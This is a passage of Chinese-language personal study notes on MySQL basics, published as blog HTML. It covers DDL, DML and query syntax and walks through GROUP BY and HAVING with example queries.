    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：MySQL"><a href="#1-导图：Map：MySQL" class="headerlink" title="1. 导图：Map：MySQL"></a>1. 导图：<a href="Map%EF%BC%9AMySQL.xmind">Map：MySQL</a></h3><hr><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/ySQL%20%E5%9F%BA%E7%A1%80/image-20250615085438498.png"></p><h3 id="2-数据库核心"><a href="#2-数据库核心" class="headerlink" title="2. 数据库核心"></a>2. 数据库核心</h3><p>数据库管理系统、数据库、表</p><hr><h3 id="3-MySQL-最佳实践"><a href="#3-MySQL-最佳实践" class="headerlink" title="3. MySQL 最佳实践"></a>3. MySQL 最佳实践</h3><hr><h3 id="4-MySQL-语法"><a href="#4-MySQL-语法" class="headerlink" title="4. MySQL 语法"></a>4. MySQL 语法</h3><h4 id="4-1-语法要求"><a href="#4-1-语法要求" class="headerlink" title="4.1. 语法要求"></a>4.1. 语法要求</h4><ol><li>SQL 语句可以单行或多行，但要以分号（<code>;</code>）结尾</li><li>MySQL 默认情况下，每条 SQL 语句的最大长度为 4MB</li></ol><hr><h4 id="4-2-注释写法"><a href="#4-2-注释写法" class="headerlink" title="4.2. 注释写法"></a>4.2. 注释写法</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 单行注释</span><br><br><span class="hljs-comment">-- 单行注释</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">多行注释</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><hr><h4 id="4-3-DDL（库、表、列）"><a href="#4-3-DDL（库、表、列）" class="headerlink" title="4.3. DDL（库、表、列）"></a>4.3. DDL（库、表、列）</h4><h5 id="4-3-1-库-操作"><a href="#4-3-1-库-操作" class="headerlink" title="4.3.1. 库 操作"></a>4.3.1. 库 操作</h5><p>&#x3D;&#x3D;1.创建数据库&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> [<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span>] &lt;repository-<span class="hljs-type">name</span>&gt; [<span class="hljs-keyword">default</span> charset 字符集] [<span class="hljs-keyword">collate</span> 排序规则];<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>若不指定字符集，默认使用 utf8mb4；</li><li>若不指定排序规则，默认使用 utf8mb4_0900_ai_ci</li></ol></blockquote><p>&#x3D;&#x3D;2.删除数据库&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> [<span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span>] &lt;repository-<span class="hljs-type">name</span>&gt;;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.更新数据库&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 修改数据库名<br># <span class="hljs-number">1.1</span>. 导出旧数据库（将旧数据库导出到一个 <span class="hljs-keyword">SQL</span> 文件中)<br>mysqldump -p &lt;<span class="hljs-built_in">old</span>-repository-<span class="hljs-type">name</span>&gt; &gt; &lt;<span class="hljs-built_in">old</span>-repository-<span class="hljs-type">name</span>&gt; .<span class="hljs-keyword">sql</span><br><br># <span class="hljs-number">1.2</span>. 创建新的数据库<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> &lt;<span class="hljs-built_in">new</span>-repository-<span class="hljs-type">name</span>&gt;;<br><br># <span class="hljs-number">1.3</span>. 将旧库文件导入新库<br>mysql -p &lt;<span class="hljs-built_in">new</span>-repository-<span class="hljs-type">name</span>&gt; &lt; &lt;<span class="hljs-built_in">new</span>-repository-<span class="hljs-type">name</span>&gt;.<span class="hljs-keyword">sql</span><br><br># <span class="hljs-number">1.4</span>. 删除旧数据库<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">DATABASE</span> &lt;<span class="hljs-built_in">old</span>-repository-<span class="hljs-type">name</span>&gt;;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.查询数据库&#x3D;&#x3D;</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 1. 查看所有数据库</span><br>show databases;<br><br><br><span class="hljs-meta"># 2. 查看当前使用的数据库</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">databses</span>()</span>;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.使用数据库&#x3D;&#x3D;</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">use</span> &lt;repository-<span class="hljs-keyword">name</span>&gt;;<br></code></pre></td></tr></table></figure><hr><h5 id="4-3-2-表-操作"><a href="#4-3-2-表-操作" class="headerlink" title="4.3.2. 表 操作"></a>4.3.2. 表 操作</h5><p>&#x3D;&#x3D;1.创建表&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> [<span class="hljs-keyword">IF</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span>] &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; (<br>    &lt;id-<span class="hljs-keyword">column</span>&gt; &lt;数据类型&gt; AUTO_INCREMENT <span class="hljs-keyword">PRIMARY KEY</span> [<span class="hljs-keyword">COMMENT</span> <span class="hljs-string">&#x27;explanation for this column&#x27;</span>],<br>    &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;数据类型&gt; <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> [<span class="hljs-keyword">DEFAULT</span> &lt;默认值&gt;] [<span class="hljs-keyword">COMMENT</span> <span class="hljs-string">&#x27;explanation for this column&#x27;</span>],<br>    &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;数据类型&gt; <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> [<span class="hljs-keyword">DEFAULT</span> &lt;默认值&gt;] [<span class="hljs-keyword">COMMENT</span> <span class="hljs-string">&#x27;explanation for this column&#x27;</span>]<br>) [ENGINE=&lt;engine-<span class="hljs-keyword">type</span>&gt;] [<span class="hljs-keyword">DEFAULT</span> CHARSET=&lt;字符集&gt;] [<span class="hljs-keyword">COMMENT</span>=<span class="hljs-string">&#x27;explanation for this table&#x27;</span>];<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.删除表&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> [<span class="hljs-keyword">if</span> <span class="hljs-keyword">exists</span>] &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt;;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.更新表&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 修改表名<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-built_in">old</span>-<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> &lt;<span class="hljs-built_in">new</span>-<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt;; <br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.查询表&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 查看当前使用的数据库所有表<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><br><br># <span class="hljs-number">2.</span> 查看表结构<br><span class="hljs-keyword">desc</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt;<br><br><br># <span class="hljs-number">3.</span> 查看建表语句<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt;;<br></code></pre></td></tr></table></figure><hr><h5 id="4-3-3-列-操作"><a href="#4-3-3-列-操作" class="headerlink" title="4.3.3. 列 操作"></a>4.3.3. 列 操作</h5><p>&#x3D;&#x3D;1.创建列&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">add</span> &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; &lt;数据类型&gt; [<span class="hljs-keyword">comment</span> <span class="hljs-string">&#x27;列的注释&#x27;</span>]<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.删除列&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">column</span> &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.修改列&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 修改列名<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">rename</span> <span class="hljs-keyword">column</span> &lt;<span class="hljs-built_in">old</span>-<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">to</span> &lt;<span class="hljs-built_in">new</span>-<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></table></figure><hr><h4 id="4-4-DML（数据增删改）"><a href="#4-4-DML（数据增删改）" class="headerlink" title="4.4. DML（数据增删改）"></a>4.4. DML（数据增删改）</h4><h5 id="4-4-1-插入数据"><a href="#4-4-1-插入数据" class="headerlink" title="4.4.1. 插入数据"></a>4.4.1. 插入数据</h5><h6 id="4-4-1-1-数据插入原则"><a href="#4-4-1-1-数据插入原则" class="headerlink" title="4.4.1.1. 数据插入原则"></a>4.4.1.1. 数据插入原则</h6><ol><li>&#x3D;&#x3D;主键顺序插入&#x3D;&#x3D;：<ol><li>插入数据时，最好安装主键的递增顺序进行插入，因为顺序插入的性能通常高于乱序插入。这可以减少索引的重组和提高插入的效率</li></ol></li><li>&#x3D;&#x3D;开启事务&#x3D;&#x3D;：<ol><li>大量数据插入时，建议使用事务以确保数据的一致性和完整性。这样可以避免由于中途失败而导致的数据不一致问题，确保操作的原子性。</li></ol></li><li>&#x3D;&#x3D;以行为计&#x3D;&#x3D;：<ol><li>插入数据都是以行为单位，即插入一行或者多行，不能插入某一行的某一条数据</li></ol></li></ol><hr><h6 id="4-4-1-2-普通插入数据"><a href="#4-4-1-2-普通插入数据" class="headerlink" title="4.4.1.2. 普通插入数据"></a>4.4.1.2. 普通插入数据</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"># 1. 模版<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> &lt;table-name&gt; [&lt;column1,column2,...&gt;] <span class="hljs-keyword">values</span> &lt;value1,value2,......&gt;<br><br><br># <span class="hljs-number">2.</span> 指定字段添加数据<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> students (name, age) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-number">20</span>);<br><br><br># 3. 全部字段添加数据<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> students <span class="hljs-keyword">values</span> (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">22</span>);<br><br><br># 4. 批量添加数据<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> students <span class="hljs-keyword">values</span> <br>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-number">20</span>),<br>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">22</span>),<br>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-number">21</span>),<br>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;David&#x27;</span>, <span class="hljs-number">23</span>),<br>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&#x27;Eva&#x27;</span>, <span class="hljs-number">19</span>);<br><br><br># 5. 主键回显<br># 5.1. 执行 inset 语句<br><span class="hljs-keyword">INSERT</span> xxxxxxx<br><br># <span class="hljs-number">5.2</span>. 获取上一条插入记录在表中的主键值<br><span class="hljs-keyword">SELECT</span> LAST_INSERT_ID();<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：主键回显</p><ol><li>执行插入语句后，可以通过执行 <code>SELECT LAST_INSERT_ID()</code> 获取上一条插入记录的主键值。这样做的主要原因是，插入记录后，我们通常需要立即对该记录进行后续操作。如果再次使用 <code>SELECT</code> 查询来获取其 ID，这会增加额外的操作开销。通过主键回显，我们可以直接获得该记录的 ID，提高效率。</li></ol></blockquote><hr><h6 id="4-4-1-3-千万级插入数据"><a href="#4-4-1-3-千万级插入数据" class="headerlink" title="4.4.1.3. 千万级插入数据"></a>4.4.1.3. 千万级插入数据</h6><hr><h5 id="4-4-2-删除数据"><a href="#4-4-2-删除数据" class="headerlink" title="4.4.2. 删除数据"></a>4.4.2. 删除数据</h5><p>删除数据同样是以行为单位，即删除一行或者多行，不能删除某一行的某一条数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 删除部分数据<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; [<span class="hljs-keyword">where</span> condition];<br><br><br># <span class="hljs-number">2.</span> 删除整个表的数据（高效）<br><span class="hljs-keyword">truncate</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt;;<br><br><br># <span class="hljs-number">3.</span> 删除分区来删除数据（高效）<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; <span class="hljs-keyword">drop</span> <span class="hljs-keyword">partition</span> &lt;<span class="hljs-keyword">partition</span>-<span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li>如果使用 <code>delete from</code> 不加条件，它会删除整个表的数据，但这种方法效率较低，不推荐使用。如果必须采用此方法，建议分批删除（例如：<code>delete from table where id between 1 and 2000</code>），并<strong>开启事务</strong>以确保数据一致性和可靠性。</li><li>方法二和方法三不需要开启事务，因为他们都很高效</li></ol></blockquote><hr><h5 id="4-4-3-更新数据"><a href="#4-4-3-更新数据" class="headerlink" title="4.4.3. 更新数据"></a>4.4.3. 更新数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span><span class="hljs-operator">-</span>name<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> <span class="hljs-operator">&lt;</span>column1<span class="hljs-operator">=</span>value1<span class="hljs-operator">&gt;</span>,<span class="hljs-operator">&lt;</span>column2<span class="hljs-operator">=</span>value2<span class="hljs-operator">&gt;</span>,.... [<span class="hljs-keyword">where</span> <span class="hljs-keyword">condition</span>];<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果需要批量更新数据，同样应该<strong>开启事务</strong></li></ol></blockquote><hr><h4 id="4-5-DQL（数据查询）"><a href="#4-5-DQL（数据查询）" class="headerlink" title="4.5. DQL（数据查询）"></a>4.5. DQL（数据查询）</h4><h5 id="4-5-1-数据查询模版"><a href="#4-5-1-数据查询模版" class="headerlink" title="4.5.1. 数据查询模版"></a>4.5.1. 数据查询模版</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> [<span class="hljs-keyword">all</span> | <span class="hljs-keyword">distinct</span>] <br>&#123; * | &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; [<span class="hljs-keyword">as</span> 列别名] | &lt;表达式 [<span class="hljs-keyword">as</span> 表达式别名]&gt; &#125;       # 选择列表，表达式支持聚合函数<br><span class="hljs-keyword">from</span> &lt;<span class="hljs-keyword">table</span>-<span class="hljs-type">name</span>&gt; [<span class="hljs-keyword">as</span> 表别名]                                    # 普通查询<br>[&lt;<span class="hljs-keyword">join</span>-<span class="hljs-keyword">type</span>&gt; <span class="hljs-keyword">join</span> &lt;other-<span class="hljs-keyword">table</span>&gt; [<span class="hljs-keyword">as</span> 表别名] <span class="hljs-keyword">on</span> &lt;连接条件&gt;]        # 多表联查<br>[<span class="hljs-keyword">where</span> &lt;行级过滤条件&gt;]                                            # 过滤条件不可使用聚合函数<br>[<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; [<span class="hljs-keyword">having</span> &lt;组级过滤条件&gt;]]                  # 分组查询，过滤条件可使用聚合函数<br>[<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> &lt;<span class="hljs-keyword">column</span>-<span class="hljs-type">name</span>&gt; [<span class="hljs-keyword">asc</span> | <span class="hljs-keyword">desc</span>]]                            # 排序查询<br>[<span class="hljs-keyword">limit</span> &lt;偏移量&gt;,&lt;行数&gt;]                                           # 分页查询<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>一定要有这样的思想，除了普通查询，其他的都是 JB 条件查询懂吗，包括子查询，例如找出每个部分工资最高的员工，条件就是：员工是要每个部门工资最高的有两个条件，</li></ol></blockquote><blockquote><p>[!NOTE] 注意事项：<br>2. <font color="#00b0f0">子查询</font>：<br>    - 子查询的结果可以看作是一个<strong>虚拟表</strong>，<strong>类似于视图</strong>，之后可以在这个虚拟表上进行进一步的查询操作<br>    - <code>virtual-table-alias</code> 就是我们为这个虚拟表起的别名，方便在后续引用这个表<br>    - 子查询内部还可以包含其他子查询，实现多层嵌套，但需注意避免无限嵌套<br>3. <font color="#00b0f0">distinct</font>：<br>    - 用于去除重复记录<br>4. <font color="#00b0f0">SQL 执行顺序（☆☆☆）</font>：<br>    - FROM -&gt; JOIN -&gt; WHERE -&gt; GROUP BY -&gt; HAVING -&gt; SELECT -&gt; DISTINCT -&gt; ORDER BY -&gt; LIMIT &#x2F; OFFSET<br>5. <font color="#00b0f0">condition 怎么写</font>:<br>    -<br>6. <font color="#00b0f0">having-condition 怎么写</font>:<br>    -<br>可以有多个字段，用逗号隔开<br>[!NOTE] 注意：<code>WHERE</code> 与 <code>HAVING</code> 的区别</p><ol><li>执行时机不同</li><li><code>WHERE</code> ：在分组之前进行条件过滤，不满足条件的记录不会参与分组。</li><li><code>HAVING</code>：在分组之后对结果进行过滤。</li><li>判断条件不同</li><li>切操作需遵循 SQL 执行顺序。在为表起别名之前，我们可以直接使用表名；但一旦为表指定了别名，之后必须使用别名，不能再使用原表名。</li><li>列明类？</li><li></li><li><code>WHERE</code> 不能对聚合函数进行判断，而 <code>HAVING</code> 可以</li></ol></blockquote><hr><h5 id="4-5-2-基本查询"><a href="#4-5-2-基本查询" class="headerlink" title="4.5.2. 基本查询"></a>4.5.2. 基本查询</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> id, order_date <span class="hljs-keyword">as</span> orderDate <span class="hljs-keyword">from</span> my_table <span class="hljs-keyword">where</span> id &gt;<span class="hljs-number">20</span>; <br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> my_table<br></code></pre></td></tr></table></figure><hr><h5 id="4-5-3-分组查询"><a href="#4-5-3-分组查询" class="headerlink" title="4.5.3. 分组查询"></a>4.5.3. 分组查询</h5><h6 id="4-5-3-1-分组查询概述"><a href="#4-5-3-1-分组查询概述" class="headerlink" title="4.5.3.1. 分组查询概述"></a>4.5.3.1. 分组查询概述</h6><p>关于分组查询，首先我们要理解分组的概念：可以这样简单理解，当我们在一张表中，发现<strong>某一列的值出现了多次</strong>，我们就可以按照这一列的值把数据分成一组一组的，这就是“分组”的基本概念。</p><p>举个例子：假设你是一家公司的老板，你有很多员工，每个员工都有所属的部门（比如：技术部、市场部、财务部……）。现在你想统计每个部门一个月要发多少工资 —— 这时候，你就可以按照“部门”这个字段来进行分组。也就是说：把属于同一个部门的员工聚在一起（分组），然后对每组员工的工资进行汇总（比如求和）。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># 1. 工资超过 100 元的员工所在部门的 部门总工资</span><br><span class="hljs-keyword">select</span> department, <span class="hljs-keyword">count</span>(staff_id) <span class="hljs-keyword">as</span> staff_count, <span class="hljs-keyword">sum</span>(amount) <span class="hljs-keyword">as</span> total_amounts<br><span class="hljs-keyword">from</span> employees<br><span class="hljs-keyword">where</span> amount &gt; <span class="hljs-number">100</span><br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> department<br>having <span class="hljs-keyword">sum</span>(amount) &gt; <span class="hljs-number">350</span>;<br><br><br><span class="hljs-meta"># 2. 统计各个工作地址上班的男性员工和女性员工的数量（根据工作地址、性别分组）、</span><br><span class="hljs-keyword">select</span> workaddress,gender,<span class="hljs-keyword">count</span>(*) <span class="hljs-string">&#x27;amount&#x27;</span> <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender,workaddress;<br><br><br><span class="hljs-meta"># 3. 查询年龄小于45的员工，根据不同工作地址，获取员工数量大于3的工作地址（根据工作地址分组）</span><br><span class="hljs-keyword">select</span> workaddress,<span class="hljs-keyword">count</span>(*) address_count <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">where</span> age &lt; <span class="hljs-number">45</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> workaddress having address_count &gt; <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>分组查询 <code>99%</code> 的情况下，要与函数结合进行查询</li></ol></blockquote><hr><h6 id="4-5-3-2-实际案例"><a href="#4-5-3-2-实际案例" class="headerlink" title="4.5.3.2. 实际案例"></a>4.5.3.2. 实际案例</h6><p>假设我们有一个员工表 <code>employees</code>，包含 <code>staff_id</code>（员工ID）、<code>department</code>（部门）和 <code>amount</code>（工资）等字段，现在我们要统计每个部门中，需要下发工资总额大于 400 的部门。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> department, <span class="hljs-built_in">count</span>(staff_id) <span class="hljs-keyword">as</span> staff_count, <span class="hljs-built_in">sum</span>(amount) <span class="hljs-keyword">as</span> total_amounts<br><span class="hljs-keyword">from</span> employees<br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> department<br><span class="hljs-keyword">having</span> <span class="hljs-built_in">sum</span>(amount) &gt; <span class="hljs-number">350</span>;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410141156407.png"></p><p>&#x3D;&#x3D;1.SQL 执行：FROM -&gt; JOIN -&gt; WHERE&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410141156407.png"></p><p>&#x3D;&#x3D;2.SQL 执行：-&gt; GROPY BY&#x3D;&#x3D;<br>可以<strong>理解为</strong>，相同组的数据被归类到一起，形成了很多表（当然这是不可能的）例如：</p><ol><li><p><strong>归类1</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410145608083.png"></p></li><li><p><strong>归类2</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410145637852.png"></p></li><li><p><strong>归类3</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410145648701.png"></p></li><li><p><strong>归类4</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410145658659.png"></p></li><li><p><strong>归类5</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410145805811.png"></p></li></ol><p>&#x3D;&#x3D;3.SQL 执行：-&gt; HAVING&#x3D;&#x3D;<br>HAVING 对前面分组后的数据进行了筛选。</p><ol><li><p><strong>筛选1</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410145817283.png"></p></li><li><p><strong>筛选2</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410145951287.png"></p></li></ol><p>&#x3D;&#x3D;4.SQL 执行：-&gt; SELECT -&gt; DISTINCT -&gt; ORDER BY -&gt; LIMIT &#x2F; OFFSET&#x3D;&#x3D;<br><code>SELECT</code> 可以<strong>理解为</strong>对前面筛选出来的多个表分别执行查询操作，然后将结果聚合成一个表。</p><ol><li><p><strong>查询1</strong><br><img 